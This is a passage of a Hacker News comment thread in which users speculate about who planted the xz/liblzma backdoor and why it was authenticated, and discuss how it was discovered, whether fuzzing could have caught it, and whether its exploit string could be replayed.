Or that they could've disclosed it and caused a lot of damage the attacker didn't necessarily want. And they easily could've been planning both a long-term way to access a huge swath of machines and also biding their time for a huge heist. They have no reason to not restrict the backdoor to their personal use. And it probably is spycraft of some sort, and I think more likely than not it's a nation-state, but not necessarily. I could see a talented individual or group wanting to pull this off. | | --- | --- | --- | | | |  |  | [varenc](user?id=varenc) [9 months ago](item?id=39899717)   | [root](#39896221) | [parent](#39897792) | [next](#39900218) [–]  I think we need to consider the context. The attacker ultimately only had control over the lzma library. I'm skeptical that there's an innocent looking way that lzma could have in the open introduced an "accidental" RCE vuln that'd affect sshd. Of course I agree that they also wanted an explicit stealth backdoor for all the other reasons, but I don't think a plausibly deniable RCE or authentication bypass vuln would have even been possible. | | --- | --- | --- | | | |  |  | [juitpykyk](user?id=juitpykyk) [9 months ago](item?id=39900218)   | [root](#39896221) | [parent](#39897179) | [prev](#39897792) | [next](#39900710) [–]  You're talking as if securing a backdoor with public cryptography is some unimaginable feat of technology. It's literally a couple hours work. | | --- | --- | --- | | | |  |  | [parl\_match](user?id=parl_match) [9 months ago](item?id=39902258)   | [root](#39896221) | [parent](#39900218) | [next](#39900311) [–]  Inserting a change like this as a one off would cause lots of scrutiny, which would probably get it detected. Instead, the bad actor spent years contributing to the project before dropping this. So, while writing the exploit might be a couple of hours work, actually pulling it off is quite a bit more difficult. | | --- | --- | --- | | | |  |  | [londons\_explore](user?id=londons_explore) [9 months ago](item?id=39904848)   | [root](#39896221) | [parent](#39902258) | [next](#39900311) [–]  Plenty of open source maintainers spend only a few hours a month on their projects. For many projects, that is enough to become the main contributor. | | --- | --- | --- | | | |  |  | [kbenson](user?id=kbenson) [9 months ago](item?id=39900311)   | [root](#39896221) | [parent](#39900218) | [prev](#39902258) | [next](#39900654) [–]  I don't think they were using complexity as the reason for that assumption, but instead goals. Adding security doesn't require a nation state's level of resources, but it is a more attractive feature for a nation state that wants to preserve it over time and prevent adversaries from making use of it. | | --- | --- | --- | | | |  |  | [heavyset\_go](user?id=heavyset_go) [9 months ago](item?id=39900743)   | [root](#39896221) | [parent](#39900311) | [next](#39900333) [–]  This makes sense in closed source products where you'll never get to audit the source for such exploits, but little sense in open source projects where anyone can audit it. That's to say an enterprise router or switch would likely have secured exploits put there by corporate and national security agencies, whereas open source exploits would benefit from the probable deniability. | | --- | --- | --- | | | |  |  | [neodymiumphish](user?id=neodymiumphish) [9 months ago](item?id=39900333)   | [root](#39896221) | [parent](#39900311) | [prev](#39900743) | [next](#39900654) [–]  And on the contrary, creating a vulnerability that’s not identifiable to a limited attack group provides for a bit more deniability and anonymity. It’s hard to say which is more favorable by a nation-state actor. | | --- | --- | --- | | | |  |  | [usrusr](user?id=usrusr) [9 months ago](item?id=39900587)   | [root](#39896221) | [parent](#39900333) | [next](#39900654) [–]  An interesting angle: if this was somehow observed in use instead of getting discovered without observing use, there would be a glaring bright cui bono associated with what it was being used *for*. Theoretically, I could even imagine that public key security motivated by some "mostly benign" actor who fell in love with the question "could I pull this off?" dreading the scenario of their future hacker superpower falling in the wrong hands. It's not entirely unthinkable that an alternative timeline where this was never discovered would only ever see this superbackdoor getting used for harmless pranks, winning bets and the like. In this unlikely scenario, the discovery, through the state actor and crime syndicate activities undoubtedly inspired by the discovery, would paradoxically lead to a less safe computing world than the alternative timeline where the person with the key had free RCE almost everywhere. | | --- | --- | --- | | | |  |  | [justinclift](user?id=justinclift) [9 months ago](item?id=39900654)   | [root](#39896221) | [parent](#39900218) | [prev](#39900311) | [next](#39900710) [–]  It'll be kind of tragic if this backdoor turns out to be the developer's pet "enable remote debugging" code, and they didn't mean for it to get out into a release. ;) | | --- | --- | --- | | | |  |  | [unkulunkulu](user?id=unkulunkulu) [9 months ago](item?id=39901524)   | [root](#39896221) | [parent](#39900654) | [next](#39900710) [–]  I would be scared to work near a person who writes his debugging tools this way :D | | --- | --- | --- | | | |  |  | [justinclift](user?id=justinclift) [9 months ago](item?id=39902499)   | [root](#39896221) | [parent](#39901524) | [next](#39900710) [–]  Heh Heh Heh "It seemed like a good idea at the time" is a pretty common story though. ;) | | --- | --- | --- | | | |  |  | [heavyset\_go](user?id=heavyset_go) [9 months ago](item?id=39900710)   | [root](#39896221) | [parent](#39897179) | [prev](#39900218) | [next](#39899313) [–]  > *Now it looks more like nation-state spycraft.* I disagree, plenty of exploits implemented WireGuard-like crypto key access to them. | | --- | --- | --- | | | |  |  | [chpatrick](user?id=chpatrick) [9 months ago](item?id=39899313)   | [root](#39896221) | [parent](#39896392) | [prev](#39897179) | [next](#39899888) [–]  Also people can come and immediately undo whatever you did if it's not authenticated. | | --- | --- | --- | | | |  |  | [Beijinger](user?id=Beijinger) [9 months ago](item?id=39899888)   | [root](#39896221) | [parent](#39896392) | [prev](#39899313) | [next](#39898665) [–]  This is just a safety measure that it does not blow up in your own face (country). | | --- | --- | --- | | | |  |  | [CommitSyn](user?id=CommitSyn) [9 months ago](item?id=39902072)   | [root](#39896221) | [parent](#39899888) | [next](#39898665) [–]  Not only did it mandate authentication, but there was also a Killswitch, and there's no other reason for that than because you have reasons to suspect someone may have access to this sensitive world-stopper exploit and use it against you. That leaves simply a (reasonably, but still) paranoid person, and people worried about that+consequences are unlikely to have the mental well-being to pull this off, or, a group of people. | | --- | --- | --- | | | |  |  | [takeda](user?id=takeda) [9 months ago](item?id=39898665)   | [parent](#39896221) | [prev](#39896392) | [next](#39896418) [–]  If you think of it as a state sponsored attack it makes a lot of sense to have a "secure" vulnerability in system that your own citizens might use. It looks like the whole contribution to xz was an effort to just inject that backdoor. For example the author created the whole test framework where he could hide the malicious payload. Before he started work on xz, he made contribution to libarchive in BSD which created a vulnerability. | | --- | --- | --- | | | |  |  | [pxx](user?id=pxx) [9 months ago](item?id=39898964)   | [root](#39896221) | [parent](#39898665) | [next](#39896418) [–]  The libarchive diff didn't create any vulnerability. The fprintf calls were consistent with others in the same repository. | | --- | --- | --- | | | |  |  | [jhugo](user?id=jhugo) [9 months ago](item?id=39900284)   | [root](#39896221) | [parent](#39898964) | [next](#39899246) [–]  It did, actually: the filename can contain terminal control characters, which thanks to the change from safe\_fprintf to fprintf, were printed without escaping, which allows the creator of the archive being extracted to control the terminal of the user extracting the archive. | | --- | --- | --- | | | |  |  | [pxx](user?id=pxx) [9 months ago](item?id=39901542)   | [root](#39896221) | [parent](#39900284) | [next](#39899246) [–]  That's (a) not exploitable without the existence of a much higher-severity exploit -- sure you can clear the screen, but that's low impact (b) possible to trigger on other extant paths; see <https://github.com/libarchive/libarchive/issues/2107> so it seems nothing new was introduced (c) kind of contrived to get to execute; you have to somehow fail to extract the archive but on the happy path you'll see a bunch of weirdly-named files I think it's distinctly higher-probability that this change was just meant to build credibility for the GitHub account. The diff is a fairly trivial patch to a minor issue filed around the same time as the pull request. | | --- | --- | --- | | | |  |  | [CommitSyn](user?id=CommitSyn) [9 months ago](item?id=39902150)   | [root](#39896221) | [parent](#39901542) | [next](#39899246) [–]  Is it possible it was part of a planned or current exploit chain, some other way it could have been utilized? | | --- | --- | --- | | | |  |  | [wholinator2](user?id=wholinator2) [9 months ago](item?id=39904191)   | [root](#39896221) | [parent](#39902150) | [next](#39899246) [–]  Yes, i think one thing we should learn from this is that suspicious code is suspicious code, and anyone asserting that some suspicious code cannot be exploited is suspicious themselves. I don't think we should inquisition half the industry, but i do think people should be a lot more careful about saying that one small exploitable thing definitely cannot be part of a larger exploit. It's obvious, basically no one knows what's going on in the \_vast\_ majority of code running out systems these days. And even if you know 99% the attackers only need to be right once | | --- | --- | --- | | | |  |  | [takeda](user?id=takeda) [9 months ago](item?id=39899246)   | [root](#39896221) | [parent](#39898964) | [prev](#39900284) | [next](#39896418) [–]  They still preferred to revert it as it looks very suspicious. <https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1068047> <https://github.com/libarchive/libarchive/pull/2101> | | --- | --- | --- | | | |  |  | [asveikau](user?id=asveikau) [9 months ago](item?id=39899322)   | [root](#39896221) | [parent](#39899246) | [next](#39896418) [–]  If I read that correctly the problem is that it prints a filename that might include terminal control sequences that come from an attacker-controlled file name. Comment in your second link: [https://github.com/libarchive/libarchive/pull/1609#issuecomm...](https://github.com/libarchive/libarchive/pull/1609#issuecomment-2028125584) | | --- | --- | --- | | | |  |  | [Alifatisk](user?id=Alifatisk) [9 months ago](item?id=39896418)   | [parent](#39896221) | [prev](#39898665) | [next](#39897569) [–]  For real, it's almost like a state-sponsored exploit. It's crafted and executed incredibly well, the performance issue feels like pure luck it got found. | | --- | --- | --- | | | |  |  | [stingraycharles](user?id=stingraycharles) [9 months ago](item?id=39896585)   | [root](#39896221) | [parent](#39896418) | [next](#39898786) [–]  I like the theory that actually, it wasn’t luck but was picked up on by detection tools of a large entity (Google / Microsoft / NSA / whatever), and they’re just presenting the story like this to keep their detection methods a secret. It’s what I would do. | | --- | --- | --- | | | |  |  | [est31](user?id=est31) [9 months ago](item?id=39896859)   | [root](#39896221) | [parent](#39896585) | [next](#39896702) [–]  I doubt that if Google detected it with some internal tool, they'd reach out to Microsoft to hide their contribution. It was reported by an MS engineer who happens to be involved in another OSS project. MS is doing business with the US intelligence community, for example there is the Skype story: First, rumors that NSA offers a lot of money for people who can break Skype's E2E encryption, then MS buys Skype, then MS changes Skype's client to not be E2E encrypted any more and to use MS servers instead of peer to peer, allowing undetectable wiretapping of arbitrary connections. But it's a quite credible story too that it was just a random discovery. Even if it was the NSA, why would they hide that capability. It doesn't take much to run a script to compare git state with uploaded source tarballs in distros like Debian (Debian has separate tarballs for the source and the source with Debian patches applied). | | --- | --- | --- | | | |  |  | [anarazel](user?id=anarazel) [9 months ago](item?id=39897640)   | [root](#39896221) | [parent](#39896859) | [next](#39899230) [–]  > It was reported by an MS engineer who happens to be involved in another OSS project. I view it as being OSS or postgresql dev that happens to work at microsoft. I've been doing the former for much longer (starting somewhere between 2005 and 2008, depending on how you count) than the latter (2019-12). | | --- | --- | --- | | | |  |  | [iliane5](user?id=iliane5) [9 months ago](item?id=39904176)   | [root](#39896221) | [parent](#39897640) | [next](#39900111) [–]  Just wanted to say thank you for your work and attention to detail, it's immensely valuable and we're all very grateful for it. | | --- | --- | --- | | | |  |  | [est31](user?id=est31) [9 months ago](item?id=39900111)   | [root](#39896221) | [parent](#39897640) | [prev](#39904176) | [next](#39899230) [–]  Thanks for the explanation. Also thanks for catching this and protecting us all; I think in the end it's way more believable that you indeed found it on your own, above was just brainless blathering into the ether =). Lastly, thanks for your Postgres contributions. | | --- | --- | --- | | | |  |  | [t0mas88](user?id=t0mas88) [9 months ago](item?id=39899230)   | [root](#39896221) | [parent](#39896859) | [prev](#39897640) | [next](#39898477) [–]  Intelligence agencies are very careful about sharing their findings, even with "friends", because the findings will disclose some information about their capabilities and possibly methods. Let's say agency A has some scanning capability on open source software that detected this backdoor attempt by agency B. If they had gone public, agency B now knows they have this ability. So agency B will adjust their ways the next time and the scanning capability becomes less useful. While if agency A had told Microsoft to "find" this by accident, nobody would know about their scanning capability. And the next attempt by agency B would only try to avoid having the performance impact this first attempt had, probably leaving it visible to agency A. | | --- | --- | --- | | | |  |  | [bevekspldnw](user?id=bevekspldnw) [9 months ago](item?id=39898477)   | [root](#39896221) | [parent](#39896859) | [prev](#39899230) | [next](#39900208) [–]  “Even if it was the NSA, why would they hide that capability” Perhaps you’re not familiar with what NSA historically stood for: Never Say Anything. | | --- | --- | --- | | | |  |  | [est31](user?id=est31) [9 months ago](item?id=39900782)   | [root](#39896221) | [parent](#39898477) | [next](#39900208) [–]  Googling for "site:nsa.gov filetype:pdf" gives tens of thousands of results with documents produced by the NSA about various things (the google counter is known to lie but that's not my point). They do publish things. | | --- | --- | --- | | | |  |  | [mistrial9](user?id=mistrial9) [9 months ago](item?id=39900208)   | [root](#39896221) | [parent](#39896859) | [prev](#39898477) | [next](#39896702) [–]  > an MS engineer no this engineer is world-known for being core PostgreSQL, a team with high standards.. unlike that company you mention | | --- | --- | --- | | | |  |  | [jeltz](user?id=jeltz) [9 months ago](item?id=39902739)   | [root](#39896221) | [parent](#39900208) | [next](#39900713) [–]  He is also one of the sharpest developers I have had the fortune to speak to (and do some minor work with on the mailing list) and he knows a lot about performance and profiling. I 100% think that he found it on his own. He would also be an odd choice for Microsoft to pick since I doubt he works anywhere close to any of their security teams (unless they went through some serious lengths to find just the guy where it would be 100% believable that he just stumbled on it). | | --- | --- | --- | | | |  |  | [est31](user?id=est31) [9 months ago](item?id=39900713)   | [root](#39896221) | [parent](#39900208) | [prev](#39902739) | [next](#39896702) [–]  Yeah definitely, good point. I got that wrong above: He is in fact a postgres contributor who happens to be MS employee and not an MS employee who happens to be a postgres contributor. | | --- | --- | --- | | | |  |  | [jsmith99](user?id=jsmith99) [9 months ago](item?id=39896702)   | [root](#39896221) | [parent](#39896585) | [prev](#39896859) | [next](#39896937) [–]  The attacker changed the projects contact details at oss fuzz (an automated detection tool). There’s an interesting discussion as to whether that would have picked up the vulnerability <https://github.com/google/oss-fuzz/issues/11760> | | --- | --- | --- | | | |  |  | [metzmanj](user?id=metzmanj) [9 months ago](item?id=39898865)   | [root](#39896221) | [parent](#39896702) | [next](#39897837) [–]  I work on oss-fuzz. I don't think it's plausible OSS-Fuzz could have found this. The backdoor required a build configuration that was not used in OSS-Fuzz. I'm guessing "Jia Tan" knew this and made changes to XZ's use of OSS-Fuzz for the purposes of cementing their position as the new maintainer of XZ, rather than out of worry OSS-Fuzz would find the backdoor as people have speculated. | | --- | --- | --- | | | |  |  | [Aloisius](user?id=Aloisius) [9 months ago](item?id=39901889)   | [root](#39896221) | [parent](#39898865) | [next](#39897837) [–]  How many oss-fuzz packages have a Dockerfile that runs apt-get install liblzma-dev first? Had this not been discovered, the backdoored version of xz could have eventually ended up in the ubuntu version oss-fuzz uses for its docker image - and linked into all those packages being tested as well. Except now there's an explanation if fuzzing starts to fail - honggfuzz uses -fsanitize which is incompatible with xz's use of ifunc, so any package that depends on it should rebuild xz from source with --disable-ifunc instead of using the binary package. | | --- | --- | --- | | | |  |  | [metzmanj](user?id=metzmanj) [9 months ago](item?id=39905769)   | [root](#39896221) | [parent](#39901889) | [next](#39897837) [–]  This is interesting, but do you think this would have aroused enough suspicion to find the backdoor (after every Ubuntu user was owned by it)? I don't see why this is the case. It wasn't a secret that ifuncs were being used in XZ. And if that's the case, it was sloppy of "Jia" to disable it in OSS-Fuzz and not do this: ``` \_\_attribute\_\_((\_\_used\_\_,\_\_no\_sanitize\_address\_\_)) ``` to the XZ source code to fix the false positive and turn off the compilation warning, no attention would have been drawn to this at all since no one would have to change their build script. With or without this PR, it's very unlikely OSS-Fuzz would have found the bug. OSS-Fuzz also happens to be on Ubuntu 20. I'm not very familiar with Ubuntu release cycles, but I think it would have been a very long time before backdoored packages made their way into Ubuntu 20. | | --- | --- | --- | | | |  |  | [meowface](user?id=meowface) [9 months ago](item?id=39897837)   | [root](#39896221) | [parent](#39896702) | [prev](#39898865) | [next](#39896937) [–]  That's a fascinating extra detail. They really tried to cover all their bases. There's some plausible evidence here that they may've tried to use alter egos to encourage Debian to update the package: <https://twitter.com/f0wlsec/status/1773824841331740708> | | --- | --- | --- | | | |  |  | [edflsafoiewq](user?id=edflsafoiewq) [9 months ago](item?id=39896937)   | [root](#39896221) | [parent](#39896585) | [prev](#39896702) | [next](#39897993) [–]  They could announce it without revealing their detection method. I don't see what the extra indirection buys them. | | --- | --- | --- | | | |  |  | [MOARDONGZPLZ](user?id=MOARDONGZPLZ) [9 months ago](item?id=39897075)   | [root](#39896221) | [parent](#39896937) | [next](#39897993) [–]  Shutting down 99.9% of speculation on how the vulnerability was found in the first place. | | --- | --- | --- | | | |  |  | [VMG](user?id=VMG) [9 months ago](item?id=39899011)   | [root](#39896221) | [parent](#39897075) | [next](#39897993) [–]  (1) obviously not (2) they could just say they found it during some routine dependency review or whatever | | --- | --- | --- | | | |  |  | [MOARDONGZPLZ](user?id=MOARDONGZPLZ) [9 months ago](item?id=39901363)   | [root](#39896221) | [parent](#39899011) | [next](#39897993) [–]  I mean, yes. I’ve read all the commentary I can get my hands on about this incident because it is fascinating and this is the first instance of some parallel construction theory of finding it I’ve seen. Second, maybe a routine dependency review is how they \_actually\_ found it but they don’t want future people like this focusing too much on that otherwise they may try to mitigate, whereas now they may focus on something inane like a 0.5 second increase in sshd’s load time or whatever. | | --- | --- | --- | | | |  |  | [TacticalCoder](user?id=TacticalCoder) [9 months ago](item?id=39897993)   | [root](#39896221) | [parent](#39896585) | [prev](#39896937) | [next](#39898827) [–]  > ... nd they’re just presenting the story like this to keep their detection methods a secret. It’s what I would do. Basically "parallel construction". It's very possible it's what happened. <https://en.wikipedia.org/wiki/Parallel_construction> | | --- | --- | --- | | | |  |  | [takeda](user?id=takeda) [9 months ago](item?id=39898827)   | [root](#39896221) | [parent](#39896585) | [prev](#39897993) | [next](#39904470) [–]  Sorry for that ugly comparison, but that explanation reminds me of the theories when covid started, that it was created by secret organization that is actually ruling the world. People love when there's some explanation that doesn't involve randomness, because with randomness looks like we don't have grasp on things. Google actually had tooling that was detecting it, but he disabled check that would show it. Google/Microsoft/NSA could just say they detected it with internal tooling and not disclose how exactly. Google and Microsoft would love to have credit. | | --- | --- | --- | | | |  |  | [lyu07282](user?id=lyu07282) [9 months ago](item?id=39904470)   | [root](#39896221) | [parent](#39896585) | [prev](#39898827) | [next](#39897804) [–]  While we are speculating, there was this case of university students trying to introduce malicious commits in the kernel in order to test open source to such attack vectors. Perhaps this was similar "research" by some students. [https://www.cnx-software.com/2021/04/22/phd-students-willful...](https://www.cnx-software.com/2021/04/22/phd-students-willfully-committed-known-malicious-changes-to-mainline-linux/) | | --- | --- | --- | | | |  |  | [meowface](user?id=meowface) [9 months ago](item?id=39897804)   | [root](#39896221) | [parent](#39896585) | [prev](#39904470) | [next](#39900841) [–]  It's really interesting to think what might've happened if they could've implemented this with much less performance overhead. How long might it have lasted for? Years? | | --- | --- | --- | | | |  |  | [heavyset\_go](user?id=heavyset_go) [9 months ago](item?id=39900841)   | [root](#39896221) | [parent](#39896585) | [prev](#39897804) | [next](#39898786) [–]  You're describing parallel construction and it is something that happens all of the time. | | --- | --- | --- | | | |  |  | [IshKebab](user?id=IshKebab) [9 months ago](item?id=39898786)   | [root](#39896221) | [parent](#39896418) | [prev](#39896585) | [next](#39897427) [–]  I don't think it was executed incredibly well. There were definitely very clever aspects but they made multiple mistakes - triggering Valgrind, the performance issue, using a `.` to break the Landlock test, not giving the author a proper background identity. I guess you could also include the fact that they made it a very obvious back door rather than an exploitable bug, but that has the advantage of only letting you exploit it so it was probably an intentional trade-off. Just think how many back doors / intentional bugs there are that we don't know about because they didn't make any of these mistakes. | | --- | --- | --- | | | |  |  | [richardfey](user?id=richardfey) [9 months ago](item?id=39899341)   | [root](#39896221) | [parent](#39898786) | [next](#39897427) [–]  Maybe it's the first successful attempt of a state which nobody would right now suspect as capable of carrying this out. Everyone is looking at the big guys but a new player has entered the game. | | --- | --- | --- | | | |  |  | [lyu07282](user?id=lyu07282) [9 months ago](item?id=39897427)   | [root](#39896221) | [parent](#39896418) | [prev](#39898786) | [next](#39896475) [–]  one question I still have is what exactly the performance issue was? I heard it might be related to enumeration of shared libraries, decoding of the scrambled strings[1], etc. anyone know for sure yet? one other point for investigation is if the code is similar to any other known implants? like the way it obfuscates strings, the way it detects debuggers, the way its setting up a vtable, there might be code fragments shared across projects. Which might give clues about its origin. [1] <https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01> | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39915323)   | [root](#39896221) | [parent](#39897427) | [next](#39896475) [–]  It's the symbol lookup that's slow. | | --- | --- | --- | | | |  |  | [400thecat](user?id=400thecat) [9 months ago](item?id=39916187)   | [root](#39896221) | [parent](#39915323) | [next](#39896475) [–]  why does the backdoor rely on symbol lookup? is it because of the use of IFUNC ? | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39917309)   | [root](#39896221) | [parent](#39916187) | [next](#39896475) [–]  I believe it is looking for functions in OpenSSH that do key validation etc | | --- | --- | --- | | | |  |  | [andersa](user?id=andersa) [9 months ago](item?id=39896475)   | [root](#39896221) | [parent](#39896418) | [prev](#39897427) | [next](#39897827) [–]  It'd make total sense if it was. This way you get to have the backdoor without your enemies being able to use it against your own companies. | | --- | --- | --- | | | |  |  | [7373737373](user?id=7373737373) [9 months ago](item?id=39897827)   | [root](#39896221) | [parent](#39896418) | [prev](#39896475) | [next](#39896453) [–]  I read someone speculating that the performance issue was intentional, so infected machines could be easily identified by an internet wide scan without arousing further suspicicion. If this is or becomes a widespread method, then anti-malware groups should perhaps conduct these scans themselves. | | --- | --- | --- | | | |  |  | [zarzavat](user?id=zarzavat) [9 months ago](item?id=39899376)   | [root](#39896221) | [parent](#39897827) | [next](#39896453) [–]  Very small differences in performance can be detected over the network as long as you have enough samples. Given that every port 22 is being hit by a gazillion attempts per day already, sample count shouldn’t be an issue. So if distinguishing infected machines was their intention they definitely over-egged it. | | --- | --- | --- | | | |  |  | [jdewerd](user?id=jdewerd) [9 months ago](item?id=39896453)   | [root](#39896221) | [parent](#39896418) | [prev](#39897827) | [next](#39896530) [–]  Yeah, we should probably expect that there are roughly 1/p(found) more of these lurking out there. Not a pleasant thought. | | --- | --- | --- | | | |  |  | [hnthrowaway0328](user?id=hnthrowaway0328) [9 months ago](item?id=39896530)   | [root](#39896221) | [parent](#39896418) | [prev](#39896453) | [next](#39897549) [–]  Do we have a detailed technical analysis of the code? I read a few analysis but they all seem preliminary. It is very useful to learn from the code. | | --- | --- | --- | | | |  |  | [coldpie](user?id=coldpie) [9 months ago](item?id=39896934)   | [root](#39896221) | [parent](#39896530) | [next](#39897549) [–]  There's a few links down at the bottom of the OP to quite detailed analysis. From there you could join a Discord where discussion is ongoing. | | --- | --- | --- | | | |  |  | [hnthrowaway0328](user?id=hnthrowaway0328) [9 months ago](item?id=39899014)   | [root](#39896221) | [parent](#39896934) | [next](#39897549) [–]  Thanks coldpie. | | --- | --- | --- | | | |  |  | [timmytokyo](user?id=timmytokyo) [9 months ago](item?id=39897549)   | [root](#39896221) | [parent](#39896418) | [prev](#39896530) | [next](#39897373) [–]  I'm not sure why everyone is 100% sure this was a state-sponsored security breach. I agree that it's more likely than not state-sponsored, but I can imagine all sorts of other groups who would have an interest in something like this, organized crime in particular. Imagine how many banks or crypto wallets they could break into with a RCE this pervasive. | | --- | --- | --- | | | |  |  | [bevekspldnw](user?id=bevekspldnw) [9 months ago](item?id=39898515)   | [root](#39896221) | [parent](#39897549) | [next](#39897779) [–]  Motive and patience. Motive as you point out is shared by many parties. Typically its only state agencies that will fund an operation with uncertain pay off over long periods of time. That type of patience is expensive. Online criminals are beholden to changing market pressures and short term investment pressures like any other start up. | | --- | --- | --- | | | |  |  | [blablabla123](user?id=blablabla123) [9 months ago](item?id=39897779)   | [root](#39896221) | [parent](#39897549) | [prev](#39898515) | [next](#39905587) [–]  Especially considering this introduced a 500ms waiting time. But surely this was quite a risky time investment, 2 years. How likely is it that this was the only attempt if this was done by a group? (And maybe there were failed attempts after trying to take over maintenance of other packages?) Maybe really a very well-funded cybercrime group that can afford such moonshot endeavours or a state group that doesn't completely know yet what it's doing or isn't that well equipped (anymore?). I'm definitely curious about analysis of attribution | | --- | --- | --- | | | |  |  | [hackeraccount](user?id=hackeraccount) [9 months ago](item?id=39905587)   | [root](#39896221) | [parent](#39897549) | [prev](#39897779) | [next](#39897373) [–]  I'm not 100% sure - it could have been a criminal(s) or even a single motivated actor. That said it's a lot of work - 2 years at least. It's an exploit that's so good that you'd have to use incredibly carefully - also because if/when it's discovered it's going to break everywhere. I've read descriptions about how the NSA (and presumably other such agencies) and they're really careful. The first job is to make sure the target doesn't get confirmation that they are in fact a target. The second is that they always cover their tracks so the target doesn't know they were a target. Criminals tend to do the first but almost never the second so a tool like this - while I'm sure they would love - isn't worth the amount of work it would take to develop. Again - I'm not 100% on this but ... 40% ? say 20% criminals, 10% lone wolf? | | --- | --- | --- | | | |  |  | [webmaven](user?id=webmaven) [9 months ago](item?id=39897373)   | [root](#39896221) | [parent](#39896418) | [prev](#39897549) | [next](#39897569) [–]  Was the performance issue pure luck? Or was it a subtle bit of sabotage by someone inside the attacking group worried about the implications of the capability? If it had been successfully and secretly deployed, this is the sort of thing that could make your leaders *much* more comfortable with starting a "limited war". There are shades of "Setec Astronomy" here. | | --- | --- | --- | | | |  |  | [papascrubs](user?id=papascrubs) [9 months ago](item?id=39900755)   | [root](#39896221) | [parent](#39897373) | [next](#39901291) [–]  Plot twist: It was a psyop to increase the scrutiny around OSS components. Kidding. Mostly... But given the amount of scrutiny folks are going to start putting into some supply chains... Probably cheaper to execute than most company's annual security awareness budgets cost. | | --- | --- | --- | | | |  |  | [neodymiumphish](user?id=neodymiumphish) [9 months ago](item?id=39901291)   | [root](#39896221) | [parent](#39897373) | [prev](#39900755) | [next](#39897569) [–]  Considering how difficult it might be (and identifiable) to attempt direct exploitation of this without being sure your target is vulnerable, it’s plausible the performance issue allowed for an identifiable delay in attempts. This might be useful in determining whether to attempt the exploit, with an auto-skip if it received a response in less than N milliseconds. | | --- | --- | --- | | | |  |  | [cesarb](user?id=cesarb) [9 months ago](item?id=39897569)   | [parent](#39896221) | [prev](#39896418) | [next](#39896420) [–]  This is called NOBUS: <https://en.wikipedia.org/wiki/NOBUS> | | --- | --- | --- | | | |  |  | [halJordan](user?id=halJordan) [9 months ago](item?id=39899045)   | [root](#39896221) | [parent](#39897569) | [next](#39896420) [–]  This is not that concept. That concept is no one but us can technically complete the exploit. Technical feasibility in that you need a supercomputer to do it, not protecting a backdoor with the normal cia triad | | --- | --- | --- | | | |  |  | [justinclift](user?id=justinclift) [9 months ago](item?id=39900723)   | [root](#39896221) | [parent](#39899045) | [next](#39896420) [–]  That doesn't seem correct: ```     If they determine the vulnerability is only exploitable by the NSA for reasons     such as computational resources, budget, or skill set, they label it as NOBUS     and will not move to patch it, but rather leave it open to exploit against current     or future targets.  ``` If (!) the NSA regards ssh keys as secure, then from that article it sounds like the NOBUS thing would fit. | | --- | --- | --- | | | |  |  | [bed99](user?id=bed99) [9 months ago](item?id=39909834)   | [root](#39896221) | [parent](#39900723) | [next](#39902860) [–]  Is it legal and possible for the NSA to socially attack someone with mental health issues this way? I'd like to rule-out some state actors by the mere heartbreaking act of socially engineering and targeting a person in pain. Not even considering the original maintainer may be a US citizen (idk). | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39979259)   | [root](#39896221) | [parent](#39909834) | [next](#39902860) [–]  You do realize that plenty of state actors have no qualms with physically torturing and killing people in the most gruesome ways possible, right? Online bullying is peanuts in that context. | | --- | --- | --- | | | |  |  | [CommitSyn](user?id=CommitSyn) [9 months ago](item?id=39902860)   | [root](#39896221) | [parent](#39900723) | [prev](#39909834) | [next](#39896420) [–]  That would only fit "If (!) the NSA regards ssh keys as secure >for everyone but them< | | --- | --- | --- | | | |  |  | [justinclift](user?id=justinclift) [9 months ago](item?id=39905420)   | [root](#39896221) | [parent](#39902860) | [next](#39896420) [–]  Not sure why? My thinking in this hypothetical scenario is that the NSA would have the private key, which is why it would be a NOBUS thing. If they didn't have the key though, then yeah it doesn't fit. Unless they can walk through ssh key security anyway. :) | | --- | --- | --- | | | |  |  | [linsomniac](user?id=linsomniac) [9 months ago](item?id=39896420)   | [parent](#39896221) | [prev](#39897569) | [next](#39902404) [–]  Am I reading it correctly that the payload signature includes the target SSH host key? So you can't just spray it around to servers, it's fairly computationally expensive to send it to a host. | | --- | --- | --- | | | |  |  | [miduil](user?id=miduil) [9 months ago](item?id=39896477)   | [root](#39896221) | [parent](#39896420) | [next](#39902404) [–]  \*host key fingerprint, but I assume what you've meant. It's practically a good backdoor then, crypto graphically protected and safe against "re-play" attacks. | | --- | --- | --- | | | |  |  | [amluto](user?id=amluto) [9 months ago](item?id=39897359)   | [root](#39896221) | [parent](#39896477) | [next](#39902404) [–]  Not quite. It still looks vulnerable: an attacker A without the private key impersonates a victim server V and reports their host key. A careless attacker B with the key tries to attack A, but an ends up recovering a valid payload targeting V. | | --- | --- | --- | | | |  |  | [Denvercoder9](user?id=Denvercoder9) [9 months ago](item?id=39897590)   | [root](#39896221) | [parent](#39897359) | [next](#39902404) [–]  I'm not too familar with the SSH protocol, but is it possible to impersonate a victim server V without having the private key to their host key? | | --- | --- | --- | | | |  |  | [pxx](user?id=pxx) [9 months ago](item?id=39898073)   | [root](#39896221) | [parent](#39897590) | [next](#39902404) [–]  This stuff is pre-auth. You can just treat the entire thing as opaque and proxy everything to the host you're trying to compromise; as soon as you have an exploit string for a given host you can just replay it. | | --- | --- | --- | | | |  |  | [robryk](user?id=robryk) [9 months ago](item?id=39900571)   | [root](#39896221) | [parent](#39898073) | [next](#39902112) [–]  Ssh does client authentication after handshake. The server is required to sign the handshake result with its private key, so you won't get past handshake if you are a server that claims to have a public key that you don't know the private key for. E: see RFC 4253, sections 8 and 10, and RFC 4252 for corroboration | | --- | --- | --- | | | |  |  | [pxx](user?id=pxx) [9 months ago](item?id=39901809)   | [root](#39896221) | [parent](#39900571) | [next](#39902112) [–]  Huh, I had erroneously thought the exploit string was sent earlier in the connection, before the handshaking completed (note the "handshake failed" error in xzbot on successful exploit, and also the fact that no logging is done). But you're right: we've verified the hostkey by the time we send the special certificate. So there's no way to effectively replay this without access to the server keys. My original comment is incorrect. I'm actually surprised there's no logging at INFO or higher after this succeeds, given that openssh typically logs preauth connection closes. But I guess the crutch is that we never log connection opens and we only really log failures in handshaking, and it's not like the backdoor is going to go out of its way to log the fact that it opened itself... | | --- | --- | --- | | | |  |  | [bandrami](user?id=bandrami) [9 